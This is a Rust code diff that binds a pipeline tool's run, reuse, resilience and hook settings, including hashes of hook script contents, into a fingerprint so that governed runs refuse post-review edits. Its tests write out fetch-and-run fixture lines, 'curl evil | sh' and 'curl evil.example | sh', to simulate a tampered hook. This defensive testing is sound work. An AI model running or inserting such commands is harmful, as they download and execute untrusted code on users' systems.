@@ -1174,6 +1174,7 @@ pub(crate) fn execution_ir_fingerprint(
     models: &[rocky_core::models::Model],
     config_identity: &str,
     governance_identity: &str,
+    exec_control_identity: &str,
     extras: &ExecutionExtras,
 ) -> Option<String> {
     let mut projection: BTreeMap<String, serde_json::Value> = BTreeMap::new();
@@ -1198,6 +1199,12 @@ pub(crate) fn execution_ir_fingerprint(
     hasher.update(config_identity.as_bytes());
     hasher.update(b"\x00gov\x00");
     hasher.update(governance_identity.as_bytes());
+    // Execution-control identity (#1095): `[run]`/`[reuse]`/`[resilience]` and
+    // the content-addressed `[hook]` set. Hashed in (never compared raw) so a
+    // post-plan edit to what executes or which shell command fires refuses at
+    // the choke-point.
+    hasher.update(b"\x00exec\x00");
+    hasher.update(exec_control_identity.as_bytes());
     hasher.update(b"\x00extras\x00");
     hasher.update(&extras_bytes);
     Some(hasher.finalize().to_hex().to_string())
@@ -1393,6 +1400,106 @@ pub(crate) fn governance_policy_identity(cfg: &rocky_core::config::RockyConfig) 
     .unwrap_or_default()
 }
 
+/// The env-resolved **execution-control** identity (#1095): the on-disk `[run]`,
+/// `[reuse]`, `[resilience]`, and `[hook]`/`[hook.webhooks]` config that governs
+/// WHAT executes and WHICH side-effecting commands fire — none of which the
+/// compiled-IR projection or the routing/governance identities capture. Folded
+/// into the execution fingerprint (hashed, never compared raw — so a
+/// `[hook].env` value is never exposed) so a post-plan edit to a skip/reuse/retry
+/// toggle or a governed hook refuses at the execution choke-point.
+///
+/// Shell hooks are **content-addressed**: binding only the command STRING would
+/// miss an edit to `scripts/notify.sh`'s bytes, so the first whitespace token of
+/// each command that resolves to a file under `config_dir` (or an absolute path)
+/// is blake3-hashed (an unreadable file yields a stable sentinel — fail-closed),
+/// mirroring the contract-content idiom in [`ExecutionExtras`]. Computed
+/// identically at plan time and at the apply choke-point over the SAME
+/// `config_dir`, so an unchanged project is byte-stable and never false-refuses.
+pub(crate) fn execution_control_identity(
+    cfg: &rocky_core::config::RockyConfig,
+    config_dir: &Path,
+) -> String {
+    // Sorted by event key (BTreeMap); list order preserves the parsed `[[hook]]`
+    // sequence. Each hook binds its command, delivery config, AND a content hash
+    // of any referenced local script.
+    let hooks: BTreeMap<String, serde_json::Value> = cfg
+        .hooks
+        .hooks
+        .iter()
+        .map(|(event, hook_or_list)| {
+            let entries: Vec<serde_json::Value> = hook_config_list(hook_or_list)
+                .into_iter()
+                .map(|h| {
+                    serde_json::json!({
+                        "command": h.command,
+                        "timeout_ms": h.timeout_ms,
+                        "on_failure": serde_json::to_value(&h.on_failure)
+                            .unwrap_or(serde_json::Value::Null),
+                        "env": serde_json::to_value(&h.env).unwrap_or(serde_json::Value::Null),
+                        "script": hook_script_content_hash(&h.command, config_dir),
+                    })
+                })
+                .collect();
+            (event.clone(), serde_json::Value::Array(entries))
+        })
+        .collect();
+    let webhooks: BTreeMap<String, serde_json::Value> = cfg
+        .hooks
+        .webhooks
+        .iter()
+        .map(|(event, wh)| {
+            (
+                event.clone(),
+                serde_json::to_value(wh).unwrap_or(serde_json::Value::Null),
+            )
+        })
+        .collect();
+    serde_json::to_value(serde_json::json!({
+        "run": serde_json::to_value(&cfg.run).unwrap_or(serde_json::Value::Null),
+        "reuse": serde_json::to_value(&cfg.reuse).unwrap_or(serde_json::Value::Null),
+        "resilience": serde_json::to_value(&cfg.resilience).unwrap_or(serde_json::Value::Null),
+        "hooks": hooks,
+        "webhooks": webhooks,
+    }))
+    .map(|v| v.to_string())
+    .unwrap_or_default()
+}
+
+/// Flatten a `[hook]` event entry (single or `[[hook]]` list) to its configs.
+fn hook_config_list(
+    hook_or_list: &rocky_core::hooks::HookConfigOrList,
+) -> Vec<&rocky_core::hooks::HookConfig> {
+    match hook_or_list {
+        rocky_core::hooks::HookConfigOrList::Single(c) => vec![c],
+        rocky_core::hooks::HookConfigOrList::Multiple(v) => v.iter().collect(),
+    }
+}
+
+/// Content-address a shell hook: hash the bytes of the first command token that
+/// resolves to an existing file (relative to `config_dir` or absolute). Returns
+/// `{path, blake3}` for a resolvable script (an unreadable file → a stable
+/// sentinel, fail-closed) or `null` when the command references no local file
+/// (its command string is still bound by [`execution_control_identity`]). So an
+/// edit to a referenced script's CONTENTS — not just its command string — moves
+/// the identity and refuses a governed apply.
+fn hook_script_content_hash(command: &str, config_dir: &Path) -> serde_json::Value {
+    for token in command.split_whitespace() {
+        let candidate = if Path::new(token).is_absolute() {
+            std::path::PathBuf::from(token)
+        } else {
+            config_dir.join(token)
+        };
+        if candidate.is_file() {
+            let blake3 = match std::fs::read(&candidate) {
+                Ok(bytes) => blake3::hash(&bytes).to_hex().to_string(),
+                Err(_) => "<unreadable-hook-script>".to_string(),
+            };
+            return serde_json::json!({ "path": token, "blake3": blake3 });
+        }
+    }
+    serde_json::Value::Null
+}
+
 /// The TOCTOU check threaded to the single execution choke-point
 /// ([`commands::run::execute_models`]). Carries the plan-authorized IR
 /// fingerprint plus the execute-time config identity so the choke-point can
@@ -1409,6 +1516,10 @@ pub struct ExecFingerprintGate {
     /// The model-independent governance identity computed from the execute-time
     /// config (roles / cache-selection).
     pub governance_identity: String,
+    /// The execute-time execution-control identity (#1095): `[run]`/`[reuse]`/
+    /// `[resilience]` + the content-addressed `[hook]` set. Carried here (like
+    /// `resolved_mask`) because `execute_models` has no `cfg`/`config_dir`.
+    pub exec_control_identity: String,
     /// The env-resolved mask map (`resolve_mask_for_env(plan-env)`). The
     /// choke-point restricts it to the executed models' classification tags when
     /// building [`ExecutionExtras`] (finding C — an unused mask entry must not
@@ -1456,6 +1567,7 @@ impl ExecFingerprintGate {
             models,
             &self.config_identity,
             &self.governance_identity,
+            &self.exec_control_identity,
             extras,
         );
         if actual.as_deref() != Some(expected) {
@@ -1541,6 +1653,10 @@ impl GovernedRunContext<'_> {
             expected: self.expected_ir_fingerprint.clone(),
             config_identity: config_policy_identity(cfg),
             governance_identity: governance_policy_identity(cfg),
+            exec_control_identity: execution_control_identity(
+                cfg,
+                self.config_path.parent().unwrap_or_else(|| Path::new(".")),
+            ),
             resolved_mask: cfg.resolve_mask_for_env(env),
             reviewed_source_schemas: self.reviewed_source_schemas.clone(),
             plan_id: self.plan_id.to_string(),
@@ -4028,8 +4144,8 @@ auto_create_schemas = true
         let models: Vec<rocky_core::models::Model> = Vec::new();
         let extras = super::ExecutionExtras::default();
         assert_ne!(
-            super::execution_ir_fingerprint(&models, &id_a, "", &extras),
-            super::execution_ir_fingerprint(&models, &snow, "", &extras),
+            super::execution_ir_fingerprint(&models, &id_a, "", "", &extras),
+            super::execution_ir_fingerprint(&models, &snow, "", "", &extras),
             "the routing identity must change the execution fingerprint"
         );
 
@@ -4135,12 +4251,13 @@ auto_create_schemas = true
     fn exec_fingerprint_gate_fail_closed_semantics() {
         let m: Vec<rocky_core::models::Model> = Vec::new();
         let extras = super::ExecutionExtras::default();
-        let expected = super::execution_ir_fingerprint(&m, "c", "g", &extras).unwrap();
+        let expected = super::execution_ir_fingerprint(&m, "c", "g", "", &extras).unwrap();
         // Genuinely-legacy (no fingerprint, not required) → allowed.
         super::ExecFingerprintGate {
             expected: None,
             config_identity: "c".to_string(),
             governance_identity: "g".to_string(),
+            exec_control_identity: String::new(),
             resolved_mask: std::collections::BTreeMap::new(),
             reviewed_source_schemas: None,
             plan_id: "p".to_string(),
@@ -4153,6 +4270,7 @@ auto_create_schemas = true
             expected: None,
             config_identity: "c".to_string(),
             governance_identity: "g".to_string(),
+            exec_control_identity: String::new(),
             resolved_mask: std::collections::BTreeMap::new(),
             reviewed_source_schemas: None,
             plan_id: "p".to_string(),
@@ -4166,6 +4284,7 @@ auto_create_schemas = true
             expected: Some(expected.clone()),
             config_identity: "c".to_string(),
             governance_identity: "g".to_string(),
+            exec_control_identity: String::new(),
             resolved_mask: std::collections::BTreeMap::new(),
             reviewed_source_schemas: None,
             plan_id: "p".to_string(),
@@ -4178,6 +4297,7 @@ auto_create_schemas = true
                 expected: Some(expected.clone()),
                 config_identity: "DIFFERENT".to_string(),
                 governance_identity: "g".to_string(),
+                exec_control_identity: String::new(),
                 resolved_mask: std::collections::BTreeMap::new(),
                 reviewed_source_schemas: None,
                 plan_id: "p".to_string(),
@@ -4193,6 +4313,7 @@ auto_create_schemas = true
                 expected: Some(expected),
                 config_identity: "c".to_string(),
                 governance_identity: "DIFFERENT".to_string(),
+                exec_control_identity: String::new(),
                 resolved_mask: std::collections::BTreeMap::new(),
                 reviewed_source_schemas: None,
                 plan_id: "p".to_string(),
@@ -4201,6 +4322,98 @@ auto_create_schemas = true
             .verify(&m, &extras)
             .is_err(),
             "a governance-identity change must refuse"
+        );
+        // #1095: an EXECUTION-CONTROL identity change (skip/reuse/resilience or a
+        // governed hook) must refuse too — bound into the fingerprint alongside
+        // routing/governance.
+        let expected_ec = super::execution_ir_fingerprint(&m, "c", "g", "", &extras).unwrap();
+        assert!(
+            super::ExecFingerprintGate {
+                expected: Some(expected_ec),
+                config_identity: "c".to_string(),
+                governance_identity: "g".to_string(),
+                exec_control_identity: "DIFFERENT".to_string(),
+                resolved_mask: std::collections::BTreeMap::new(),
+                reviewed_source_schemas: None,
+                plan_id: "p".to_string(),
+                require: true,
+            }
+            .verify(&m, &extras)
+            .is_err(),
+            "an execution-control identity change must refuse (#1095)"
+        );
+    }
+
+    /// #1095 closure: [`execution_control_identity`] binds `[run]`/`[reuse]`/
+    /// `[resilience]` AND content-addresses `[hook]` scripts, so a post-plan edit
+    /// to any of them moves the identity (→ the governed apply refuses at the
+    /// choke-point), while an UNCHANGED project is byte-stable (no false-refuse).
+    #[test]
+    fn execution_control_identity_binds_config_and_content_addresses_hooks() {
+        let dir = tempfile::tempdir().unwrap();
+        let script = dir.path().join("notify.sh");
+        std::fs::write(&script, b"#!/bin/sh\necho reviewed\n").unwrap();
+        let root = dir.path();
+        let load = |body: &str| -> rocky_core::config::RockyConfig {
+            let p = root.join("rocky.toml");
+            std::fs::write(&p, body).unwrap();
+            rocky_core::config::load_rocky_config(&p).unwrap()
+        };
+        let base_toml = "[adapter]\ntype = \"duckdb\"\npath = \"x.duckdb\"\n\n\
+            [pipeline.p]\ntype = \"transformation\"\nmodels = \"models/**\"\n\n\
+            [pipeline.p.target]\nadapter = \"default\"\n\n\
+            [run]\nskip_unchanged = false\n\n\
+            [hook.on_pipeline_start]\ncommand = \"notify.sh\"\n";
+        let base = super::execution_control_identity(&load(base_toml), root);
+
+        // Unchanged config + unchanged script → byte-stable (no false-refuse).
+        assert_eq!(
+            base,
+            super::execution_control_identity(&load(base_toml), root),
+            "an unchanged project must produce a stable execution-control identity"
+        );
+
+        // (a) `[run].skip_unchanged` flip → moves (it arms the post-fingerprint
+        // skip gate, so a reviewed-to-build plan could otherwise become a no-op).
+        let skip = base_toml.replace("skip_unchanged = false", "skip_unchanged = true");
+        assert_ne!(
+            base,
+            super::execution_control_identity(&load(&skip), root),
+            "a [run].skip_unchanged flip must move the identity"
+        );
+
+        // (b) `[reuse]` toggle → moves.
+        let reuse = format!("{base_toml}\n[reuse]\nenabled = true\n");
+        assert_ne!(
+            base,
+            super::execution_control_identity(&load(&reuse), root),
+            "a [reuse] toggle must move the identity"
+        );
+
+        // (c) `[resilience]` change → moves.
+        let resil = format!("{base_toml}\n[resilience]\ntransient_max_retries = 9\n");
+        assert_ne!(
+            base,
+            super::execution_control_identity(&load(&resil), root),
+            "a [resilience] change must move the identity"
+        );
+
+        // (d) hook COMMAND edit → moves (the classic post-review arbitrary command).
+        let cmd = base_toml.replace("command = \"notify.sh\"", "command = \"curl evil | sh\"");
+        assert_ne!(
+            base,
+            super::execution_control_identity(&load(&cmd), root),
+            "a [hook] command edit must move the identity"
+        );
+
+        // (e) referenced SCRIPT CONTENTS edit, command string UNCHANGED → moves.
+        // Binding only the command string would miss this — content-addressing
+        // (blake3 of the script bytes) catches it. This is the #1095(c) core.
+        std::fs::write(&script, b"#!/bin/sh\ncurl evil.example | sh\n").unwrap();
+        assert_ne!(
+            base,
+            super::execution_control_identity(&load(base_toml), root),
+            "editing a hook's referenced script CONTENTS must move the identity"
         );
     }
 
